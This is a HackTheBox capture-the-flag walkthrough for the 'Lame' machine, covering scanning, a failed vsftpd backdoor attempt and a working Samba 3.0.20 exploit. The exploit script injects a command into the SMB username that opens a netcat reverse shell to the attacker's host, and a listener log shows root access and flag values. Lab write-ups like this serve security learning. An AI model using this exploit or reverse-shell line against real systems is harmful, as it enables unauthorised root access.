# HackTheBox Lame Walkthrough

This is a Walkthrough how I get the user and root flag on the machine. All my scan results are stored in the [attachments](./attachments) folder.

achine details:

- Machine Name : Lame
- IP address: 10.10.10.3
- OS: Linux
- Difficulty: Easy

## Scanning

In this table I summarize the open ports and protocols and the XML version of the full results.

| Scan Type         | Open Ports/Protocols   | XML Output File                                |
|-------------------|------------------------|------------------------------------------------|
| Nmap IP Scan      | 1 (ICMP)               | [ip_legacy.xml](./attachments/ip_legacy.xml)   |
| Nmap TCP SYN Scan | 21, 22, 139, 445, 3632 | [tcp_legacy.xml](./attachments/tcp_legacy.xml) |
| Nmap UDP Scan     | -                      | [udp_legacy.xml](./attachments/udp_legacy.xml) |

## Enumeration

### OS Enumeration

The Nmap OS detection did not find clear match for OS. But the SMB enumeration found Unix (Debian).

### SMB Enumeration

```bash
root@Kali:/# msfconsole

 _                                                    _
/ \    /\         __                         _   __  /_/ __
| |\  / | _____   \ \           ___   _____ | | /  \ _   \ \
| | \/| | | ___\ |- -|   /\    / __\ | -__/ | || | || | |- -|
|_|   | | | _|__  | |_  / -\ __\ \   | |    | | \__/| |  | |_
      |/  |____/  \___\/ /\ \\___/   \/     \__|    |_\  \___\


       =[ metasploit v5.0.101-dev                         ]
+ -- --=[ 2048 exploits - 1105 auxiliary - 344 post       ]
+ -- --=[ 566 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

etasploit tip: Use the resource command to run commands from a file

msf5 > use auxiliary/scanner/smb/smb_version
msf5 auxiliary(scanner/smb/smb_version) > show options

odule options (auxiliary/scanner/smb/smb_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass                     no        The password for the specified username
   SMBUser                     no        The username to authenticate as
   THREADS    1                yes       The number of concurrent threads (max one per host)

msf5 auxiliary(scanner/smb/smb_version) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
msf5 auxiliary(scanner/smb/smb_version) > exploit

[*] 10.10.10.3:445        - Host could not be identified: Unix (Samba 3.0.20-Debian)
[*] 10.10.10.3:445        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/smb/smb_version) >
```

### Searching Vulnerabilities

I google for [samba 3.0.20-debian exploit](https://www.google.com/search?q=samba+3.0.20-debian+exploit&oq=Samba+3.0.20-Debian&aqs=chrome.1.69i57j0l4.1529j0j9&sourceid=chrome&ie=UTF-8) and  for [vsftpd 2.3.4 exploit](https://www.google.com/search?q=vsftpd+2.3.4+exploit&oq=vsFTPd+2.3.4+&aqs=chrome.1.69i57j0l7.1471j0j7&sourceid=chrome&ie=UTF-8).

I found the following vulnerabilities:
- [exploit-smb-3.0.20.py](https://github.com/macha97/exploit-smb-3.0.20/blob/master/exploit-smb-3.0.20.py)
- [VSFTPD v2.3.4 Backdoor Command Execution](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor)

## Exploit

### VSFTPD Exploit

I tried the Metaspoilt modul against the host but the exploit did not work:

```bash
root@Kali:/# msfconsole

               .;lxO0KXXXK0Oxl:.
           ,o0WMMMMMMMMMMMMMMMMMMKd,
        'xNMMMMMMMMMMMMMMMMMMMMMMMMMWx,
      :KMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK:
    .KMMMMMMMMMMMMMMMWNNNWMMMMMMMMMMMMMMMX,
   lWMMMMMMMMMMMXd:..     ..;dKMMMMMMMMMMMMo
  xMMMMMMMMMMWd.               .oNMMMMMMMMMMk
 oMMMMMMMMMMx.                    dMMMMMMMMMMx
.WMMMMMMMMM:                       :MMMMMMMMMM,
xMMMMMMMMMo                         lMMMMMMMMMO
NMMMMMMMMW                    ,cccccoMMMMMMMMMWlccccc;
MMMMMMMX                     ;KMMMMMMMMMMMMMMMMMMX:
NMMMMMMMMW.                      ;KMMMMMMMMMMMMMMX:
xMMMMMMMMMd                        ,0MMMMMMMMMMK;
.WMMMMMMMMMc                         'OMMMMMM0,
 lMMMMMMMMMMk.                         .kMMO'
  dMMMMMMMMMMWd'                         ..
   cWMMMMMMMMMMMNxc'.                ##########
    .0MMMMMMMMMMMMMMMMWc            #+#    #+#
      ;0MMMMMMMMMMMMMMMo.          +:+
        .dNMMMMMMMMMMMMo          +#++:++#+
           'oOWMMMMMMMMo                +:+
               .,cdkO0K;        :+:    :+:
                                :::::::+:
                      Metasploit

       =[ metasploit v5.0.101-dev                         ]
+ -- --=[ 2048 exploits - 1105 auxiliary - 344 post       ]
+ -- --=[ 566 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

etasploit tip: View advanced module options with advanced

msf5 > use exploit/unix/ftp/vsftpd_234_backdoor
[*] No payload configured, defaulting to cmd/unix/interact
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > show options

odule options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   21               yes       The target port (TCP)


Payload options (cmd/unix/interact):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Exploit target:

   Id  Name
   --  ----
   0   Automatic


msf5 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.3:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
msf5 exploit(unix/ftp/vsftpd_234_backdoor) >
```

### SMB Exploit

I changed the the exploit code to use Netcat reverse shell instead of the Metasploit payload:

```python
#!/usr/bin/python3
#exploit Samba smbd 3.0.20-Debian

from smb import *
from smb.SMBConnection import *

userID = '/=` nohup nc 10.10.14.23 4444 -e /bin/sh`'
password = 'password'
victim_ip = '10.10.10.3'

conn = SMBConnection(userID, password, "HELLO", "TEST", use_ntlm_v2=False)
conn.connect(victim_ip, 445)

```

#### Shell 1: Use the Exploit

```bash
root@Kali:/# python3 smb_exploit.py
```

#### Shell 2: Listen for the Connection

The session already has ROOT privilege so the only think left is to find the user and root flag on the machine.

```bash
root@Kali:/# nc -nlvp 4444
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.10.3.
Ncat: Connection from 10.10.10.3:56066.
id
uid=0(root) gid=0(root)
uname -a
Linux lame 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
pwd
/
cat /root/root.txt
92caac3be140ef409e45721348a4e9df
cat /home/makis/user.txt
69454a937d94f5f0225ea00acd2e84c5
```

